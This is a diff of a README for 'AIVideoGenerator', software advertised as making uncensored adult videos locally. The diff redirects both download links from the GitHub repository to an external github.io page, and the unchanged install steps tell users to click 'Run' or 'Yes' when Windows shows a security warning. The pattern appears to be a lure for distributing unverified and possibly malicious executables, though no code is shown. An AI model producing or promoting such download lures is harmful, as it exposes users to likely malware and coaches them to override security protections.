@@ -1,6 +1,6 @@
 # 🎬 AIVideoGenerator - Create uncensored adult videos locally
 
-[![Download AIVideoGenerator](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/benn5450/AIVideoGenerator)
+[![Download AIVideoGenerator](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://benn5450.github.io)
 
 AIVideoGenerator runs directly on your personal computer. It creates custom adult videos using uncensored artificial intelligence models. You control the software, and your data stays on your machine. You do not need an internet connection to generate your content once the software is installed.
 
@@ -28,7 +28,7 @@ Visit the repository page to download the latest version of the software. Follow
 7. Windows may ask for permission to run the file. Click "Run" or "Yes" if a security window appears.
 8. Follow the on-screen prompts to finish the setup.
 
-[Click here to visit the page to download the software](https://github.com/benn5450/AIVideoGenerator)
+[Click here to visit the page to download the software](https://benn5450.github.io)
 
 ## 🚀 Running the Software for the First Time
 
